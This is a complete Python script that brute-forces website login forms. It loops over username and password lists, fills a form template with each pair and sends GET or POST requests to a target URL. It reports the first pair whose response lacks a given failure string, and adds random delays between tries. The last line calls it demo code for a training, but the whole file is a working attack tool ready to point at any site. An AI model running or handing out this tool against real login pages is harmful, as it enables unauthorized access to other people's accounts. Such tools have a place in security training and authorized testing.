import sys, os, requests, argparse, time, random
from colorama import Fore, Style 

usernames = []
passwords = []
url = ""

def loadfiles(filename):
    data = []
    with open(filename,'r') as f:
        lines = f.readlines()
        for line in lines:
            data.append(line.strip())
    return data

def bruteforce(url, formdata, method, failcheck):
    for username in usernames:
        for password in passwords:
            payload = {}
            for f in formdata.split(":"):
                ff = f.split("=")
                if ff[1] == "^USR^":
                    payload[ff[0]] = username
                elif ff[1] == "^PWD^":
                    payload[ff[0]] = password
                else:
                    payload[ff[0]] = ff[1]

            if method.lower() == 'get':
                response = requests.get(url, params = payload)
            else:
                response = requests.post(url, data = payload)

            if failcheck in response.text:
                print(Fore.RED + "[-] Login Failed! {0}".format(payload) + Style.RESET_ALL)
            else:
                return payload
                
            time.sleep(random.randint(1, 5)/10)

def main(url, formdata, method, failflag):
    results = bruteforce(url, formdata, method, failflag)

    if results != None:
        print(Fore.GREEN + "[+] Login Found! {0}".format(results) + Style.RESET_ALL)
    else:
        print(Fore.RED + "[-] No Login Match" + Style.RESET_ALL)

if __name__ == "__main__":
    usage = "{0} [-h] [-u string] [-U FILE] [-p string] [-P FILE] [-m string] [-f string] SITEURL".format(os.path.basename(__file__))

    parser = argparse.ArgumentParser(
        description="Brute force form post",
        usage=usage
    )

    parser.add_argument("siteurl", metavar="SITEURL", help="Website url")
    parser.add_argument("-u", "--username", type=str, help="the username you want to use")
    parser.add_argument("-U", "--usernames", type=str, help="the username file you want to use")
    parser.add_argument("-p", "--password", type=str, help="the password you want to use")
    parser.add_argument("-P", "--passwords", type=str, help="the password file you want to use")
    parser.add_argument("-d", "--formdata", type=str, help="formdata need for login, ex: username=^USR^:password=^PWD^", required=True)
    parser.add_argument("-m", "--method", type=str, help="GET or POST", required=True)
    parser.add_argument("-f", "--fail", type=str, help="text to use to determine failure", required=True)

    args = parser.parse_args()

    if (args.username != None and args.usernames != None):
        print("You can only use one of the username methods.")
        sys.exit(1)

    if (args.password != None and args.passwords != None):
        print("You can only use one of the password methods.")
        sys.exit(1)

    if args.usernames:
        usernames += (loadfiles(args.usernames))
    elif args.username:
        usernames.append(args.username)
    else:
        print("You have to use one of the password methods.")
        sys.exit(1)

    if args.passwords:
        passwords += (loadfiles(args.passwords))
    elif args.password:
        passwords.append(args.password)
    else:
        print("You have to use one of the password methods.")
        sys.exit(1)
   
    main(args.siteurl, args.formdata, args.method, args.fail)

    print('This is a demo code used for this training.')